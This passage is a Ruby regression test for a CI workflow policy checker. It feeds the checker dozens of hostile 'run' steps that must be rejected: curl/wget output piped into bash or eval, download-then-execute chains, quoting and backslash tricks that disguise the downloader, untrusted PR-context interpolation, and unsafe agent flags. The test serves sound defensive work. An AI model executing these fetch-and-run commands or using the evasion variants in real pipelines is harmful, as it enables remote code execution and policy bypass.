  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event.pull_request.number }}"' }]) }),
  false,
  'direct github context interpolation is forbidden except github.sha and github.event_name'
)
add_case.call(
  'trusted-pr-base-ref-in-run',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'echo "${{ github.event.pull_request.base.ref }}"' }]) }),
  false,
  'direct github context interpolation is forbidden except github.sha and github.event_name'
)
add_case.call(
  'untrusted-pr-body-bracket-in-run',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => 'echo "${{ github[\'event\'][\'pull_request\'][\'body\'] }}"' }]
      )
    }
  ),
  false,
  'direct github context interpolation is forbidden except github.sha and github.event_name'
)

# Parser/adversarial bypass cases: any curl/wget run outside the exact literal probe must fail.
downloader_parser_adversarial_cases = {
  'curl-pipe-bash' => 'curl -fsSL https://example.invalid/install | bash',
  'wget-pipe-sh' => 'wget -qO- https://example.invalid/install | sh',
  'curl-pipe-bin-bash' => 'curl -fsSL https://example.invalid/install | /bin/bash',
  'wget-pipe-env-sh' => 'wget -qO- https://example.invalid/install | env sh',
  'curl-pipe-shell' => 'curl -fsSL https://example.invalid/install | sh',
  'curl-pipe-sudo-bash' => 'curl -fsSL https://example.invalid/install | sudo bash',
  'wget-pipe-command' => 'wget -qO- https://example.invalid/install | command sh',
  'wget-pipe-command-sh' => 'wget -qO- https://example.invalid/install | command sh',
  'curl-pipe-nonshell' => 'curl -fsSL https://example.invalid/data | jq .',
  'process-substitution' => 'bash <(curl -fsSL https://example.invalid/install)',
  'bash-process-substitution-curl' => 'bash <(curl -fsSL https://example.invalid/install)',
  'command-substitution' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
  'shell-command-substitution-wget' => 'sh -c "$(wget -qO- https://example.invalid/install)"',
  'eval-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
  'eval-curl-substitution' => 'eval "$(curl -fsSL https://example.invalid/install)"',
  'curl-download-file-then-bash' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh && bash /tmp/install.sh',
  'wget-download-file-then-sh' => 'wget -q -O /tmp/install.sh https://example.invalid/install.sh && sh /tmp/install.sh',
  'curl-download-binary-then-execute' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
  'wget-download-chmod-execute' => 'wget -q -O /tmp/tool https://example.invalid/tool && chmod +x /tmp/tool && /tmp/tool',
  'curl-download-via-output-option' => 'curl --output /tmp/data https://example.invalid/data',
  'wget-download-via-output-document' => 'wget --output-document=/tmp/data https://example.invalid/data',
  'external-curl-with-checksum-still-forbidden-v1' => 'curl -fsSL -o /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
  'external-wget-with-checksum-still-forbidden-v1' => 'wget -q -O /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
  'curl-variable-url-with-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 "$URL" >/dev/null # http://127.0.0.1:3000/health',
  'curl-variable-url-from-previous-line' => "URL=http://127.0.0.1:3000/health\ncurl --disable --fail --silent --show-error --max-time 10 \"$URL\" >/dev/null",
  'curl-loopback-command-substitution-then-bash' => 'bash -c "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
  'curl-loopback-response-assigned-then-executed' => "PAYLOAD=\"$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)\"\nbash -c \"$PAYLOAD\"",
  'curl-loopback-follow-redirect' => 'curl --disable --fail --silent --show-error --location --max-time 10 http://127.0.0.1:3000/health >/dev/null',
  'curl-loopback-short-L' => 'curl --disable --fail --silent --show-error -L --max-time 10 http://127.0.0.1:3000/health >/dev/null',
  'curl-loopback-combined-sSLO' => 'curl -sSLO http://127.0.0.1:3000/health',
  'curl-loopback-output-file' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/health http://127.0.0.1:3000/health',
  'curl-loopback-remote-name' => 'curl --disable --fail --silent --show-error --max-time 10 --remote-name http://127.0.0.1:3000/health',
  'curl-config-file' => 'curl --config ./curl.conf http://127.0.0.1:3000/health',
  'curl-short-K-config' => 'curl -K ./curl.conf http://127.0.0.1:3000/health',
  'curl-loopback-pipe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health | jq .',
  'curl-loopback-command-chain' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null && bash /tmp/install.sh',
  'curl-loopback-semicolon-command' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null; bash /tmp/install.sh',
  'curl-loopback-comment-injection' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null # trusted',
  'curl-loopback-multiple-urls' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health https://example.invalid/payload >/dev/null',
  'curl-loopback-backtick' => '`curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health`',
  'curl-loopback-process-substitution' => 'bash <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
  'curl-loopback-to-eval' => 'eval "$(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)"',
  'curl-loopback-to-source' => 'source <(curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health)',
  'wget-loopback-health-check' => 'wget --spider http://127.0.0.1:3000/health',
  'wget-external-download' => 'wget https://example.invalid/install.sh',
  'external-curl-with-fake-loopback-comment' => 'curl --disable --fail --silent --show-error --max-time 10 https://example.invalid/install # http://127.0.0.1:3000/health',
  'external-curl-with-checksum' => 'curl --disable --fail --silent --show-error --max-time 10 --output /tmp/tool https://example.invalid/tool && shasum -a 256 -c checksums.txt',
  'curl-loopback-no-timeout' => 'curl --disable --fail --silent --show-error http://127.0.0.1:3000/health >/dev/null',
  'curl-loopback-numeric-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://2130706433:3000/health >/dev/null',
  'curl-loopback-hex-host' => 'curl --disable --fail --silent --show-error --max-time 10 http://0x7f000001:3000/health >/dev/null',
  'curl-loopback-userinfo' => 'curl --disable --fail --silent --show-error --max-time 10 http://user@127.0.0.1:3000/health >/dev/null',
  'curl-loopback-port-overflow' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:65536/health >/dev/null',
  'curl-loopback-env-expansion' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:${PORT}/health >/dev/null',
  'curl-loopback-ordinary-file-redirect' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >health.txt',
  'curl-loopback-without-config-disable' => 'curl --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
  'shell-escaped-curl-backslash' => 'c\url -fsSL https://example.invalid/install | bash',
  'shell-escaped-wget-backslash' => 'w\get https://example.invalid/install.sh',
  'shell-quoted-wget-middle' => 'w"get" https://example.invalid/install.sh',
  'shell-empty-quoted-curl' => 'c""url https://example.invalid/install.sh',
  'shell-single-quoted-segment-curl' => "'cu'rl https://example.invalid/install.sh",
  'shell-double-quoted-segment-curl' => 'c"ur"l https://example.invalid/install.sh',
  'shell-adjacent-quoted-wget' => "'w''g''e''t' https://example.invalid/install.sh",
  'shell-uppercase-escaped-curl' => 'C\URL https://example.invalid/install.sh',
  'shell-backslash-newline-curl' => "c\\\nurl https://example.invalid/install.sh",
  'shell-no-space-pipe-curl' => 'c\url https://example.invalid/install.sh|bash',
  'shell-env-wrapped-escaped-curl' => 'env c\url https://example.invalid/install.sh',
  'shell-command-wrapped-quoted-wget' => 'command w"get" https://example.invalid/install.sh',
  'shell-variable-command-curl' => 'cmd=curl; $cmd https://example.invalid/install.sh',
  'shell-quoted-variable-command-curl' => "cmd='curl'\n\"$cmd\" https://example.invalid/install.sh",
  'shell-command-substitution-builds-curl' => '"$(printf c\url)" https://example.invalid/install.sh',
  'shell-printf-builds-wget' => '$(printf w"get") https://example.invalid/install.sh',
  'shell-eval-containing-curl' => 'eval "c\url https://example.invalid/install.sh"',
  'shell-bash-c-containing-curl' => 'bash -c "c\url https://example.invalid/install.sh"',
  'shell-sh-c-containing-wget' => 'sh -c "w\get https://example.invalid/install.sh"',
  'shell-unterminated-quote-fail-closed' => 'echo "unterminated'
}

downloader_canonicalization_case_names.concat(
  downloader_parser_adversarial_cases.keys.grep(/\Ashell-/)
)

downloader_parser_adversarial_cases.each do |name, command|
  add_case.call(
    name,
    workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
    false,
    'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
  )
end
add_case.call(
  'download-in-one-step-execute-in-next-step',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [
          { 'run' => 'curl -fsSL -o /tmp/install.sh https://example.invalid/install.sh' },
          { 'run' => 'bash /tmp/install.sh' }
        ]
      )
    }
  ),
  false,
  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
)
add_case.call(
  'download-one-step-execute-next-step',
  workflow_yaml(
    safe_sha,
    jobs: {
      'unsafe' => standard_job(
        safe_sha,
        'steps' => [
          { 'run' => 'curl --output /tmp/install.sh https://example.invalid/install.sh' },
          { 'run' => 'bash /tmp/install.sh' }
        ]
      )
    }
  ),
  false,
  'policy v1 forbids curl/wget except an exact literal loopback curl health probe'
)

# Valid workflow semantic cases: the complete run string is the literal policy-v1 probe.
add_case.call(
  'curl-literal-127-health-check',
  workflow_yaml(
    safe_sha,
    jobs: {
      'safe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null' }]
      )
    }
  ),
  true
)
add_case.call(
  'curl-literal-localhost-health-check',
  workflow_yaml(
    safe_sha,
    jobs: {
      'safe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]
      )
    }
  ),
  true
)
add_case.call(
  'curl-literal-ipv6-loopback-health-check',
  workflow_yaml(
    safe_sha,
    jobs: {
      'safe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null' }]
      )
    }
  ),
  true
)
{
  'literal-loopback-127-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null',
  'literal-loopback-localhost-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null',
  'literal-loopback-ipv6-probe' => 'curl --disable --fail --silent --show-error --max-time 10 http://[::1]:3000/health >/dev/null'
}.each do |name, command|
  downloader_canonicalization_case_names << name
  add_case.call(
    name,
    workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => command }]) }),
    true
  )
end
add_case.call(
  'curl-loopback-health-check',
  workflow_yaml(
    safe_sha,
    jobs: {
      'safe' => standard_job(
        safe_sha,
        'steps' => [{ 'run' => "curl --disable --fail --silent --show-error --max-time 10 http://127.0.0.1:3000/health >/dev/null\n" }]
      )
    }
  ),
  true
)
add_case.call(
  'curl-localhost-health-check',
  workflow_yaml(safe_sha, jobs: { 'safe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'curl --disable --fail --silent --show-error --max-time 10 http://localhost:3000/health >/dev/null' }]) }),
  true
)
add_case.call(
  'danger-full-access',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'codex --danger-full-access' }]) }),
  false,
  'unsafe runner flag'
)
add_case.call(
  'yolo',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'agent --yolo' }]) }),
  false,
  'unsafe runner flag'
)
add_case.call(
  'auto-merge',
  workflow_yaml(safe_sha, jobs: { 'unsafe' => standard_job(safe_sha, 'steps' => [{ 'run' => 'gh pr merge 1' }]) }),
  false,
  'auto-merge commands are forbidden'
)
add_case.call('yaml-alias', "name: alias\non: [push]\npermissions: &p\n  contents: read\njobs:\n  test:\n    permissions: *p\n", false, 'forbidden alias')
add_case.call('oversized-workflow', "# generated oversize fixture\n#{'x' * (513 * 1024)}", false, 'workflow exceeds')
add_case.call('malformed-yaml', "name: [broken\n", false, 'invalid YAML')

passing_cases = cases.count { |_name, (_content, should_pass, _error)| should_pass }

Dir.mktmpdir('graylum-workflow-policy-') do |root|
  cases.each do |name, (content, should_pass, expected_error)|
    directory = File.join(root, name)
    unless content == :missing_workflow_directory
      FileUtils.mkdir_p(directory)
      case content
      when Hash
        content.each { |file_name, file_content| File.write(File.join(directory, file_name), file_content) }
      when :symlinked_required_workflow
        File.write(File.join(directory, 'ci.fixture'), manifest_workflow)
        File.symlink('ci.fixture', File.join(directory, 'ci.yml'))
        File.write(File.join(directory, 'security.yml'), manifest_workflow)
      when :non_regular_required_workflow
        FileUtils.mkdir_p(File.join(directory, 'ci.yml'))
        File.write(File.join(directory, 'security.yml'), manifest_workflow)
      else
        File.write(File.join(directory, 'ci.yml'), content)
        File.write(File.join(directory, 'security.yml'), manifest_workflow)
      end
    end
    _stdout, stderr, status = Open3.capture3('ruby', checker, directory)
    actual = status.success?
    next if actual == should_pass && (expected_error.nil? || stderr.include?(expected_error))

    warn "#{name}: expected pass=#{should_pass} and error=#{expected_error.inspect}, got pass=#{actual}: #{stderr}"
    exit 1
  end
end

repository_root = File.expand_path('../..', __dir__)
danger_root = Dir.mktmpdir('graylum-unexpected-fixture-root-')
sentinel = File.join(danger_root, 'must-survive.txt')
File.write(sentinel, 'do not delete')

dangerous_fixture_cases = [
  ['missing-argument', []],
  ['empty-path', ['']],
  ['filesystem-root', ['/']],
  ['current-directory', ['.']],
  ['parent-directory', ['..']],
  ['repository-root', [repository_root]],
  ['unexpected-temp-directory', [danger_root]]
]

begin
  dangerous_fixture_cases.each do |name, arguments|
    _stdout, _stderr, status = Open3.capture3(
      { 'GITHUB_WORKSPACE' => repository_root },
      'bash',
      fixture_generator,
      *arguments
    )
    next unless status.success?

    warn "#{name}: fixture generator accepted a dangerous target"
    exit 1
  end

  workspace_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.workspace.#{Process.pid}.#{rand(1_000_000)}")
  _stdout, _stderr, workspace_status = Open3.capture3(
    { 'GITHUB_WORKSPACE' => Dir.tmpdir },
    'bash',
    fixture_generator,
    workspace_fixture_root
  )
  if workspace_status.success? || File.exist?(workspace_fixture_root)
    warn 'github-workspace-root: fixture generator accepted or created a target inside GITHUB_WORKSPACE'
    exit 1
  end

  unless File.file?(sentinel)
    warn 'fixture generator deleted caller-owned content'
    exit 1
  end

  safe_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.#{Process.pid}.#{rand(1_000_000)}")
  while File.exist?(safe_fixture_root)
    safe_fixture_root = File.join(Dir.tmpdir, "graylum-secret-scan-fixtures.#{Process.pid}.#{rand(1_000_000)}")
  end

  _stdout, stderr, status = Open3.capture3(
    { 'GITHUB_WORKSPACE' => repository_root },
    'bash',
    fixture_generator,
    safe_fixture_root
  )
  unless status.success?
    warn "safe fixture directory was rejected: #{stderr}"
    exit 1
  end

  generated_files = Dir.glob(File.join(safe_fixture_root, '{docs,tests}', '*')).select { |path| File.file?(path) }
  unless generated_files.length == 6
    warn "expected 6 generated fixture files, got #{generated_files.length}"
    exit 1
  end
ensure
  FileUtils.rm_rf(safe_fixture_root) if defined?(safe_fixture_root) && safe_fixture_root.start_with?(Dir.tmpdir)
  FileUtils.rm_rf(workspace_fixture_root) if defined?(workspace_fixture_root) && workspace_fixture_root.start_with?(Dir.tmpdir)
  FileUtils.rm_rf(danger_root)
end

puts "Fixture directory safety regressions passed (#{dangerous_fixture_cases.length + 1} dangerous targets rejected)."
puts "Wrapped expression regressions passed (#{wrapped_expression_case_names.length} cases)."
puts "Implicit if expression regressions passed (#{implicit_if_expression_case_names.length} cases)."
puts "Downloader canonicalization regressions passed (#{downloader_canonicalization_case_names.length} cases)."
puts "Workflow policy regression tests passed (#{cases.length} cases, #{cases.length - passing_cases} bypass attempts)."
